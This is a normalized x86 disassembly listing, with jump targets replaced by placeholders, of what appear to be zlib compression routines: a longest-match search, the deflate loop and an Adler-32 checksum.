mov ecx [ ebp + 0x8 ]
mov cx [ ecx + 0x64 ]
mov [ edx + eax * 2 ] cx
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x58 ]
sub eax 0x1
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x58 ] eax
mov edx [ ebp + 0x8 ]
cmp [ edx + 0x58 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x64 ]
add ecx 0x1
mov edx [ ebp + 0x8 ]
mov [ edx + 0x64 ] ecx
jmp r-xdata
jmp r-xdata
sub_407c7a
push ebp
mov ebp esp
sub esp 0x34
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x74 ]
mov [ ebp - 0x2c ] ecx
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x30 ]
mov ecx [ ebp + 0x8 ]
add eax [ ecx + 0x64 ]
mov [ ebp - 0x14 ] eax
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x70 ]
mov [ ebp - 0x18 ] eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x88 ]
mov [ ebp - 0xc ] edx
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x24 ]
sub ecx 0x106
mov edx [ ebp + 0x8 ]
cmp [ edx + 0x64 ] ecx
jbe r-xdata
mov [ ebp - 0x34 ] 0x0
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x24 ]
sub ecx 0x106
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x64 ]
sub eax ecx
mov [ ebp - 0x34 ] eax
jmp r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ebp - 0xc ]
cmp edx [ ecx + 0x6c ]
jbe r-xdata
mov eax [ ebp - 0x2c ]
shr eax 0x2
mov [ ebp - 0x2c ] eax
mov ecx [ ebp - 0x34 ]
mov [ ebp - 0x20 ] ecx
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x38 ]
mov [ ebp - 0x28 ] eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x2c ]
mov [ ebp - 0x1c ] edx
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x30 ]
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x64 ]
lea ecx [ ecx + eax + 0x102 ]
mov [ ebp - 0x30 ] ecx
mov edx [ ebp - 0x14 ]
add edx [ ebp - 0x18 ]
mov al [ edx - 0x1 ]
mov [ ebp - 0x8 ] al
mov ecx [ ebp - 0x14 ]
add ecx [ ebp - 0x18 ]
mov dl [ ecx ]
mov [ ebp - 0x4 ] dl
mov eax [ ebp + 0x8 ]
mov ecx [ ebp + 0x8 ]
mov edx [ eax + 0x70 ]
cmp edx [ ecx + 0x84 ]
jb r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x30 ]
add eax [ ebp + 0xc ]
mov [ ebp - 0x10 ] eax
mov ecx [ ebp - 0x10 ]
add ecx [ ebp - 0x18 ]
xor edx edx
mov dl [ ecx ]
mov eax [ ebp - 0x4 ]
and eax 0xff
cmp edx eax
jne r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x6c ]
mov [ ebp - 0xc ] ecx
jmp r-xdata
mov ecx [ ebp - 0x10 ]
add ecx [ ebp - 0x18 ]
xor edx edx
mov dl [ ecx - 0x1 ]
mov eax [ ebp - 0x8 ]
and eax 0xff
cmp edx eax
jne r-xdata
mov eax [ ebp + 0xc ]
and eax [ ebp - 0x1c ]
mov ecx [ ebp - 0x28 ]
xor edx edx
mov dx [ ecx + eax * 2 ]
mov [ ebp + 0xc ] edx
mov eax [ ebp + 0xc ]
cmp eax [ ebp - 0x20 ]
jbe r-xdata
mov ecx [ ebp - 0x10 ]
xor edx edx
mov dl [ ecx ]
mov eax [ ebp - 0x14 ]
xor ecx ecx
mov cl [ eax ]
cmp edx ecx
jne r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ ebp - 0x18 ]
cmp eax [ edx + 0x6c ]
ja r-xdata
mov ecx [ ebp - 0x2c ]
sub ecx 0x1
mov [ ebp - 0x2c ] ecx
cmp [ ebp - 0x2c ] 0x0
jne r-xdata
mov edx [ ebp - 0x10 ]
add edx 0x1
mov [ ebp - 0x10 ] edx
mov eax [ ebp - 0x10 ]
xor ecx ecx
mov cl [ eax ]
mov edx [ ebp - 0x14 ]
xor eax eax
mov al [ edx + 0x1 ]
cmp ecx eax
je r-xdata
mov ecx [ ebp + 0x8 ]
mov eax [ ecx + 0x6c ]
mov eax [ ebp - 0x18 ]
jmp r-xdata
mov ecx [ ebp - 0x14 ]
add ecx 0x2
mov [ ebp - 0x14 ] ecx
mov edx [ ebp - 0x10 ]
add edx 0x1
mov [ ebp - 0x10 ] edx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x30 ]
sub eax [ ebp - 0x14 ]
mov ecx 0x102
sub ecx eax
mov [ ebp - 0x24 ] ecx
mov edx [ ebp - 0x30 ]
sub edx 0x102
mov [ ebp - 0x14 ] edx
mov eax [ ebp - 0x24 ]
cmp eax [ ebp - 0x18 ]
jle r-xdata
mov ecx [ ebp - 0x14 ]
add ecx 0x1
mov [ ebp - 0x14 ] ecx
mov edx [ ebp - 0x14 ]
xor eax eax
mov al [ edx ]
mov ecx [ ebp - 0x10 ]
add ecx 0x1
mov [ ebp - 0x10 ] ecx
mov edx [ ebp - 0x10 ]
xor ecx ecx
mov cl [ edx ]
cmp eax ecx
jne r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ebp + 0xc ]
mov [ ecx + 0x68 ] edx
mov eax [ ebp - 0x24 ]
mov [ ebp - 0x18 ] eax
mov ecx [ ebp - 0x24 ]
cmp ecx [ ebp - 0xc ]
jl r-xdata
mov edx [ ebp - 0x14 ]
add edx 0x1
mov [ ebp - 0x14 ] edx
mov eax [ ebp - 0x14 ]
xor ecx ecx
mov cl [ eax ]
mov edx [ ebp - 0x10 ]
add edx 0x1
mov [ ebp - 0x10 ] edx
mov eax [ ebp - 0x10 ]
xor edx edx
mov dl [ eax ]
cmp ecx edx
jne r-xdata
mov edx [ ebp - 0x14 ]
add edx [ ebp - 0x18 ]
mov al [ edx - 0x1 ]
mov [ ebp - 0x8 ] al
mov ecx [ ebp - 0x14 ]
add ecx [ ebp - 0x18 ]
mov dl [ ecx ]
mov [ ebp - 0x4 ] dl
jmp r-xdata
mov eax [ ebp - 0x14 ]
add eax 0x1
mov [ ebp - 0x14 ] eax
mov ecx [ ebp - 0x14 ]
xor edx edx
mov dl [ ecx ]
mov eax [ ebp - 0x10 ]
add eax 0x1
mov [ ebp - 0x10 ] eax
mov ecx [ ebp - 0x10 ]
xor eax eax
mov al [ ecx ]
cmp edx eax
jne r-xdata
mov ecx [ ebp - 0x14 ]
add ecx 0x1
mov [ ebp - 0x14 ] ecx
mov edx [ ebp - 0x14 ]
xor eax eax
mov al [ edx ]
mov ecx [ ebp - 0x10 ]
add ecx 0x1
mov [ ebp - 0x10 ] ecx
mov edx [ ebp - 0x10 ]
xor ecx ecx
mov cl [ edx ]
cmp eax ecx
jne r-xdata
mov edx [ ebp - 0x14 ]
add edx 0x1
mov [ ebp - 0x14 ] edx
mov eax [ ebp - 0x14 ]
xor ecx ecx
mov cl [ eax ]
mov edx [ ebp - 0x10 ]
add edx 0x1
mov [ ebp - 0x10 ] edx
mov eax [ ebp - 0x10 ]
xor edx edx
mov dl [ eax ]
cmp ecx edx
jne r-xdata
mov eax [ ebp - 0x14 ]
add eax 0x1
mov [ ebp - 0x14 ] eax
mov ecx [ ebp - 0x14 ]
xor edx edx
mov dl [ ecx ]
mov eax [ ebp - 0x10 ]
add eax 0x1
mov [ ebp - 0x10 ] eax
mov ecx [ ebp - 0x10 ]
xor eax eax
mov al [ ecx ]
cmp edx eax
jne r-xdata
mov ecx [ ebp - 0x14 ]
add ecx 0x1
mov [ ebp - 0x14 ] ecx
mov edx [ ebp - 0x14 ]
xor eax eax
mov al [ edx ]
mov ecx [ ebp - 0x10 ]
add ecx 0x1
mov [ ebp - 0x10 ] ecx
mov edx [ ebp - 0x10 ]
xor ecx ecx
mov cl [ edx ]
cmp eax ecx
jne r-xdata
mov edx [ ebp - 0x14 ]
cmp edx [ ebp - 0x30 ]
jb r-xdata
mov eax [ ebp - 0x14 ]
add eax 0x1
mov [ ebp - 0x14 ] eax
mov ecx [ ebp - 0x14 ]
xor edx edx
mov dl [ ecx ]
mov eax [ ebp - 0x10 ]
add eax 0x1
mov [ ebp - 0x10 ] eax
mov ecx [ ebp - 0x10 ]
xor eax eax
mov al [ ecx ]
cmp edx eax
jne r-xdata
sub_407fa9
push ebp
mov ebp esp
sub esp 0x2c
push ebx
mov [ ebp - 0x8 ] 0x0
mov ecx [ ebp + 0x8 ]
cmp [ ecx + 0x6c ] 0x3
jb r-xdata
mov ecx [ ebp + 0x8 ]
push ecx
call sub_407450
add esp 0x4
mov edx [ ebp + 0x8 ]
cmp [ edx + 0x6c ] 0x106
jae r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x58 ]
mov [ edx + 0x70 ] ecx
mov edx [ ebp + 0x8 ]
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x68 ]
mov [ edx + 0x5c ] ecx
mov edx [ ebp + 0x8 ]
mov [ edx + 0x58 ] 0x2
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ ebp + 0x8 ]
mov edx [ edx + 0x40 ]
mov ecx [ eax + 0x50 ]
shl edx cl
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x64 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x30 ]
xor ebx ebx
mov bl [ eax + ecx + 0x2 ]
xor edx ebx
mov ecx [ ebp + 0x8 ]
and edx [ ecx + 0x4c ]
mov eax [ ebp + 0x8 ]
mov [ eax + 0x40 ] edx
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x40 ]
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x3c ]
xor eax eax
mov ax [ ecx + edx * 2 ]
mov [ ebp - 0x8 ] eax
mov ecx [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
mov eax [ ecx + 0x64 ]
and eax [ edx + 0x2c ]
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x38 ]
mov cx [ ebp - 0x8 ]
mov [ edx + eax * 2 ] cx
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x40 ]
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x3c ]
mov ecx [ ebp + 0x8 ]
mov cx [ ecx + 0x64 ]
mov [ edx + eax * 2 ] cx
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x6c ] 0x0
jne r-xdata
cmp [ ebp + 0xc ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x70 ] 0x3
jb r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ ebp + 0x8 ]
mov edx [ eax + 0x70 ]
cmp edx [ ecx + 0x78 ]
jae r-xdata
jmp r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x60 ] 0x0
je r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
mov eax [ ecx + 0x58 ]
cmp eax [ edx + 0x70 ]
ja r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x64 ]
sub ecx [ ebp - 0x8 ]
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x24 ]
sub eax 0x106
cmp ecx eax
ja r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x60 ] 0x0
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn
mov edx [ ebp + 0x8 ]
mov [ edx + 0x60 ] 0x1
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x64 ]
add ecx 0x1
mov edx [ ebp + 0x8 ]
mov [ edx + 0x64 ] ecx
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x6c ]
sub ecx 0x1
mov edx [ ebp + 0x8 ]
mov [ edx + 0x6c ] ecx
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x64 ]
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x30 ]
mov dl [ ecx + edx - 0x1 ]
mov [ ebp - 0x18 ] dl
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x1698 ]
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x169c ]
mov [ eax + ecx * 2 ] 0x0
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x1690 ]
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x1698 ]
mov al [ ebp - 0x18 ]
mov [ edx + ecx ] al
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x1698 ]
add edx 0x1
mov eax [ ebp + 0x8 ]
mov [ eax + 0x1698 ] edx
mov ecx [ ebp - 0x18 ]
and ecx 0xff
mov edx [ ebp + 0x8 ]
mov ax [ edx + ecx * 4 + 0x8c ]
add ax 0x1
mov ecx [ ebp - 0x18 ]
and ecx 0xff
mov edx [ ebp + 0x8 ]
mov [ edx + ecx * 4 + 0x8c ] ax
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x1694 ]
sub ecx 0x1
mov edx [ ebp + 0x8 ]
xor eax eax
cmp [ edx + 0x1698 ] ecx
sete al
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x64 ]
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x6c ]
lea edx [ edx + ecx - 0x3 ]
mov [ ebp - 0xc ] edx
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x70 ]
sub ecx 0x3
mov [ ebp - 0x14 ] cl
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x64 ]
sub eax 0x1
mov ecx [ ebp + 0x8 ]
sub eax [ ecx + 0x5c ]
mov [ ebp - 0x10 ] ax
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x1698 ]
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x169c ]
mov cx [ ebp - 0x10 ]
mov [ edx + eax * 2 ] cx
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x1690 ]
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x1698 ]
mov cl [ ebp - 0x14 ]
mov [ eax + edx ] cl
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x1698 ]
add eax 0x1
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x1698 ] eax
mov dx [ ebp - 0x10 ]
sub dx 0x1
mov [ ebp - 0x10 ] dx
mov eax [ ebp - 0x14 ]
and eax 0xff
xor ecx ecx
mov cl [ eax + r--data ]
mov edx [ ebp + 0x8 ]
mov ax [ edx + ecx * 4 + 0x490 ]
add ax 0x1
mov ecx [ ebp - 0x14 ]
and ecx 0xff
xor edx edx
mov dl [ ecx + r--data ]
mov ecx [ ebp + 0x8 ]
mov [ ecx + edx * 4 + 0x490 ] ax
mov edx [ ebp - 0x10 ]
and edx 0xffff
cmp edx 0x100
jge r-xdata
mov ecx [ ebp + 0x8 ]
cmp [ ecx + 0x80 ] 0x2
je r-xdata
mov edx [ ebp + 0x8 ]
cmp [ edx + 0x54 ] 0x0
jl r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x64 ]
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x30 ]
mov dl [ ecx + edx - 0x1 ]
mov [ ebp - 0x1c ] dl
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x1698 ]
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x169c ]
mov [ eax + ecx * 2 ] 0x0
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x1690 ]
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x1698 ]
mov al [ ebp - 0x1c ]
mov [ edx + ecx ] al
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x1698 ]
add edx 0x1
mov eax [ ebp + 0x8 ]
mov [ eax + 0x1698 ] edx
mov ecx [ ebp - 0x1c ]
and ecx 0xff
mov edx [ ebp + 0x8 ]
mov ax [ edx + ecx * 4 + 0x8c ]
add ax 0x1
mov ecx [ ebp - 0x1c ]
and ecx 0xff
mov edx [ ebp + 0x8 ]
mov [ edx + ecx * 4 + 0x8c ] ax
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x1694 ]
sub ecx 0x1
mov edx [ ebp + 0x8 ]
xor eax eax
cmp [ edx + 0x1698 ] ecx
sete al
mov [ ebp - 0x4 ] eax
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x60 ] 0x0
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x6c ] 0x106
jae r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x64 ]
add ecx 0x1
mov edx [ ebp + 0x8 ]
mov [ edx + 0x64 ] ecx
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x6c ]
sub ecx 0x1
mov edx [ ebp + 0x8 ]
mov [ edx + 0x6c ] ecx
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
cmp [ ecx + 0x10 ] 0x0
jne r-xdata
mov ecx [ ebp + 0x8 ]
cmp [ ecx + 0x54 ] 0x0
jl r-xdata
mov edx [ ebp - 0x10 ]
and edx 0xffff
sar edx 0x7
xor eax eax
mov al [ edx + r--data ]
mov [ ebp - 0x20 ] eax
mov eax [ ebp - 0x10 ]
and eax 0xffff
xor ecx ecx
mov cl [ eax + r--data ]
mov [ ebp - 0x20 ] ecx
jmp r-xdata
mov edx [ ebp + 0x8 ]
cmp [ edx + 0x58 ] 0x5
ja r-xdata
mov edx [ ebp - 0x8 ]
push edx
mov eax [ ebp + 0x8 ]
push eax
call sub_407c7a
add esp 0x8
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x58 ] eax
mov [ ebp - 0x2c ] 0x0
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x30 ]
mov edx [ ebp + 0x8 ]
add ecx [ edx + 0x54 ]
mov [ ebp - 0x2c ] ecx
jmp r-xdata
jmp r-xdata
xor eax eax
jmp r-xdata
mov [ ebp - 0x28 ] 0x0
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x30 ]
mov ecx [ ebp + 0x8 ]
add eax [ ecx + 0x54 ]
mov [ ebp - 0x28 ] eax
jmp r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x70 ]
sub eax 0x1
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x70 ] eax
mov edx [ ebp + 0x8 ]
cmp [ edx + 0x70 ] 0x0
jne r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ ebp + 0x8 ]
mov edx [ edx + 0x40 ]
mov ecx [ eax + 0x50 ]
shl edx cl
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x64 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x30 ]
xor ebx ebx
mov bl [ eax + ecx + 0x2 ]
xor edx ebx
mov ecx [ ebp + 0x8 ]
and edx [ ecx + 0x4c ]
mov eax [ ebp + 0x8 ]
mov [ eax + 0x40 ] edx
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x40 ]
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x3c ]
xor eax eax
mov ax [ ecx + edx * 2 ]
mov [ ebp - 0x8 ] eax
mov ecx [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
mov eax [ ecx + 0x64 ]
and eax [ edx + 0x2c ]
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x38 ]
mov cx [ ebp - 0x8 ]
mov [ edx + eax * 2 ] cx
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x40 ]
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x3c ]
mov ecx [ ebp + 0x8 ]
mov cx [ ecx + 0x64 ]
mov [ edx + eax * 2 ] cx
mov ecx [ ebp - 0x20 ]
mov edx [ ebp + 0x8 ]
mov ax [ edx + ecx * 4 + 0x980 ]
add ax 0x1
mov ecx [ ebp - 0x20 ]
mov edx [ ebp + 0x8 ]
mov [ edx + ecx * 4 + 0x980 ] ax
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x1694 ]
sub ecx 0x1
mov edx [ ebp + 0x8 ]
xor eax eax
cmp [ edx + 0x1698 ] ecx
sete al
mov [ ebp - 0x4 ] eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x70 ]
sub edx 0x1
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x6c ]
sub ecx edx
mov edx [ ebp + 0x8 ]
mov [ edx + 0x6c ] ecx
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x70 ]
sub ecx 0x2
mov edx [ ebp + 0x8 ]
mov [ edx + 0x70 ] ecx
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x80 ] 0x1
je r-xdata
mov eax [ ebp + 0xc ]
sub eax 0x4
neg eax
sbb eax eax
and al 0xfe
add eax 0x3
xor eax eax
cmp [ ebp + 0xc ] 0x4
setne al
dec eax
and eax 0x2
jmp r-xdata
xor eax eax
cmp [ ebp + 0xc ] 0x4
sete al
push eax
mov ecx [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
mov eax [ ecx + 0x64 ]
sub eax [ edx + 0x54 ]
push eax
mov ecx [ ebp - 0x2c ]
push ecx
mov edx [ ebp + 0x8 ]
push edx
call sub_409112
add esp 0x10
mov eax [ ebp + 0x8 ]
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x64 ]
mov [ eax + 0x54 ] edx
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
push ecx
call sub_406d00
add esp 0x4
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
cmp [ eax + 0x10 ] 0x0
jne r-xdata
jmp r-xdata
push 0x0
mov edx [ ebp + 0x8 ]
mov eax [ ebp + 0x8 ]
mov ecx [ edx + 0x64 ]
sub ecx [ eax + 0x54 ]
push ecx
mov edx [ ebp - 0x28 ]
push edx
mov eax [ ebp + 0x8 ]
push eax
call sub_409112
add esp 0x10
mov ecx [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x64 ]
mov [ ecx + 0x54 ] eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
push edx
call sub_406d00
add esp 0x4
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x64 ]
add ecx 0x1
mov edx [ ebp + 0x8 ]
mov [ edx + 0x64 ] ecx
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x64 ]
cmp ecx [ ebp - 0xc ]
ja r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax + 0x60 ] 0x0
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x58 ] 0x2
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x64 ]
add eax 0x1
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x64 ] eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov edx [ ebp + 0x8 ]
mov [ edx + 0x58 ] 0x2
mov ecx [ ebp + 0x8 ]
cmp [ ecx + 0x58 ] 0x3
jne r-xdata
jmp r-xdata
mov edx [ ebp + 0x8 ]
cmp [ edx + 0x54 ] 0x0
jl r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ ebp + 0x8 ]
mov ecx [ edx + 0x64 ]
sub ecx [ eax + 0x68 ]
cmp ecx 0x1000
jbe r-xdata
mov [ ebp - 0x24 ] 0x0
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x30 ]
mov edx [ ebp + 0x8 ]
add ecx [ edx + 0x54 ]
mov [ ebp - 0x24 ] ecx
jmp r-xdata
xor eax eax
jmp r-xdata
push 0x0
mov eax [ ebp + 0x8 ]
mov ecx [ ebp + 0x8 ]
mov edx [ eax + 0x64 ]
sub edx [ ecx + 0x54 ]
push edx
mov eax [ ebp - 0x24 ]
push eax
mov ecx [ ebp + 0x8 ]
push ecx
call sub_409112
add esp 0x10
mov edx [ ebp + 0x8 ]
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x64 ]
mov [ edx + 0x54 ] ecx
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
push eax
call sub_406d00
add esp 0x4
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
cmp [ edx + 0x10 ] 0x0
jne r-xdata
sub_4086be
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x0
je r-xdata
mov edx [ ebp + 0x10 ]
push edx
mov eax [ ebp + 0xc ]
push eax
call calloc
add esp 0x8
pop ebp
retn
mov eax [ ebp + 0x10 ]
sub eax [ ebp + 0x10 ]
mov ecx [ ebp + 0xc ]
add ecx eax
mov [ ebp + 0xc ] ecx
sub_408700
push ebp
mov ebp esp
sub esp 0x10
mov eax [ ebp + 0x8 ]
and eax 0xffff
mov [ ebp - 0x4 ] eax
mov ecx [ ebp + 0x8 ]
shr ecx 0x10
and ecx 0xffff
mov [ ebp - 0x8 ] ecx
cmp [ ebp + 0xc ] 0x0
jne r-xdata
cmp [ ebp + 0x10 ] 0x0
jbe r-xdata
mov eax 0x1
jmp r-xdata
mov eax [ ebp - 0x8 ]
shl eax 0x10
or eax [ ebp - 0x4 ]
cmp [ ebp + 0x10 ] 0x15b0
jae r-xdata
mov esp ebp
pop ebp
retn
mov [ ebp - 0x10 ] 0x15b0
mov edx [ ebp + 0x10 ]
mov [ ebp - 0x10 ] edx
jmp r-xdata
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov edx [ ebp + 0xc ]
xor eax eax
mov al [ edx ]
mov ecx [ ebp - 0x4 ]
add ecx eax
mov [ ebp - 0x4 ] ecx
mov edx [ ebp - 0x8 ]
add edx [ ebp - 0x4 ]
mov [ ebp - 0x8 ] edx
mov eax [ ebp + 0xc ]
xor ecx ecx
mov cl [ eax + 0x1 ]
mov edx [ ebp - 0x4 ]
add edx ecx
mov [ ebp - 0x4 ] edx
mov eax [ ebp - 0x8 ]
add eax [ ebp - 0x4 ]
mov [ ebp - 0x8 ] eax
mov ecx [ ebp + 0xc ]
xor edx edx
mov dl [ ecx + 0x2 ]
mov eax [ ebp - 0x4 ]
add eax edx
mov [ ebp - 0x4 ] eax
mov ecx [ ebp - 0x8 ]
add ecx [ ebp - 0x4 ]
mov [ ebp - 0x8 ] ecx
mov edx [ ebp + 0xc ]
xor eax eax
mov al [ edx + 0x3 ]
mov ecx [ ebp - 0x4 ]
add ecx eax
mov [ ebp - 0x4 ] ecx
mov edx [ ebp - 0x8 ]
add edx [ ebp - 0x4 ]
mov [ ebp - 0x8 ] edx
mov eax [ ebp + 0xc ]
xor ecx ecx
mov cl [ eax + 0x4 ]
mov edx [ ebp - 0x4 ]
add edx ecx
mov [ ebp - 0x4 ] edx
mov eax [ ebp - 0x8 ]
add eax [ ebp - 0x4 ]
mov [ ebp - 0x8 ] eax
mov ecx [ ebp + 0xc ]
xor edx edx
mov dl [ ecx + 0x5 ]
mov eax [ ebp - 0x4 ]
add eax edx
mov [ ebp - 0x4 ] eax
mov ecx [ ebp - 0x8 ]
add ecx [ ebp - 0x4 ]
mov [ ebp - 0x8 ] ecx
mov edx [ ebp + 0xc ]
xor eax eax
mov al [ edx + 0x6 ]
mov ecx [ ebp - 0x4 ]
add ecx eax
mov [ ebp - 0x4 ] ecx
mov edx [ ebp - 0x8 ]
add edx [ ebp - 0x4 ]
mov [ ebp - 0x8 ] edx
mov eax [ ebp + 0xc ]
xor ecx ecx
mov cl [ eax + 0x7 ]
mov edx [ ebp - 0x4 ]
add edx ecx
mov [ ebp - 0x4 ] edx
mov eax [ ebp - 0x8 ]
add eax [ ebp - 0x4 ]
mov [ ebp - 0x8 ] eax
mov ecx [ ebp + 0xc ]
xor edx edx
mov dl [ ecx + 0x8 ]
mov eax [ ebp - 0x4 ]
add eax edx
mov [ ebp - 0x4 ] eax
mov ecx [ ebp - 0x8 ]
add ecx [ ebp - 0x4 ]
mov [ ebp - 0x8 ] ecx
mov edx [ ebp + 0xc ]
xor eax eax
mov al [ edx + 0x9 ]
mov ecx [ ebp - 0x4 ]
add ecx eax
mov [ ebp - 0x4 ] ecx
mov edx [ ebp - 0x8 ]
add edx [ ebp - 0x4 ]
mov [ ebp - 0x8 ] edx
mov eax [ ebp + 0xc ]
xor ecx ecx
mov cl [ eax + 0xa ]
mov edx [ ebp - 0x4 ]
add edx ecx
mov [ ebp - 0x4 ] edx
mov eax [ ebp - 0x8 ]
add eax [ ebp - 0x4 ]
mov [ ebp - 0x8 ] eax
mov ecx [ ebp + 0xc ]
xor edx edx
mov dl [ ecx + 0xb ]
mov eax [ ebp - 0x4 ]
add eax edx
mov [ ebp - 0x4 ] eax
mov ecx [ ebp - 0x8 ]
add ecx [ ebp - 0x4 ]
mov [ ebp - 0x8 ] ecx
mov edx [ ebp + 0xc ]
xor eax eax
mov al [ edx + 0xc ]
mov ecx [ ebp - 0x4 ]
add ecx eax
mov [ ebp - 0x4 ] ecx
mov edx [ ebp - 0x8 ]
add edx [ ebp - 0x4 ]
mov [ ebp - 0x8 ] edx
mov eax [ ebp + 0xc ]
xor ecx ecx
mov cl [ eax + 0xd ]
mov edx [ ebp - 0x4 ]
add edx ecx
mov [ ebp - 0x4 ] edx
mov eax [ ebp - 0x8 ]
add eax [ ebp - 0x4 ]
mov [ ebp - 0x8 ] eax
mov ecx [ ebp + 0xc ]
xor edx edx
mov dl [ ecx + 0xe ]
mov eax [ ebp - 0x4 ]
add eax edx
mov [ ebp - 0x4 ] eax
mov ecx [ ebp - 0x8 ]
add ecx [ ebp - 0x4 ]
